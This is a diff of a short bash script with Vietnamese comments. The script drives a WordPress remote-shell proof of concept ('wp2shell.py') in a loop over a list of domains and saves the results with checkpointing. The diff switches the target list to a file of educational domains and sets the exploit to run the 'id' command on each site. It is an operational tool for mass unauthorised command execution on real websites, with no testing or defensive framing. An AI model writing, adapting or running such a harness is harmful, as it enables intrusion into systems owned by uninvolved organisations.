@@ -1,12 +1,12 @@
 # Reference: https://github.com/Icex0/wp2shell-poc
 
 #!/usr/bin/env bash
-# Cách dùng: ./run_all.sh <user> [--reset]
+# Cách dùng: bash run.sh <user> [--reset]
 set -uo pipefail
 
-FILE="./data/wp_domain.txt"
-OUT="results.txt"
-CHECKPOINT=".run_checkpoint"
+FILE="./data/edu_domain.txt"
+OUT="output.txt"
+CHECKPOINT=".checkpoint"
 
 # ── Kiểm tra tham số ──────────────────────────────────────────────────────────
 [ -z "${1:-}" ] && { echo "Dùng: $0 <user> [--reset]" >&2; exit 1; }
@@ -67,7 +67,7 @@ while IFS= read -r raw_line || [ -n "$raw_line" ]; do
 
     {
         echo "=== [$n] $line ==="
-        python3 wp2shell.py "$USER_CMD" "https://$line" -i 2>&1
+        python3 wp2shell.py "$USER_CMD" "https://$line" --cmd id 2>&1
         echo
     } >> "$OUT"
 
